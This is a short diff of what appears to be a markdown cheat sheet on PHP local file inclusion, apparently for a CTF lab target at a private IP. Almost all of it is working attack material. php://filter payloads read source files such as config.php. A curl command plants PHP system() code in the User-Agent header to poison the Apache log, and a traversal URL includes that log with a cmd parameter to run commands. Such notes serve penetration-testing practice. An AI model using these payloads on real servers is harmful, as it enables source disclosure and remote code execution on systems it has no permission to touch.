@@ -40,7 +40,6 @@ http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/.
 ?inc=php://filter/read=convert.base64-encode/resource=config.php
 
 curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
-
 http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
 ```
 ## php - path truncation
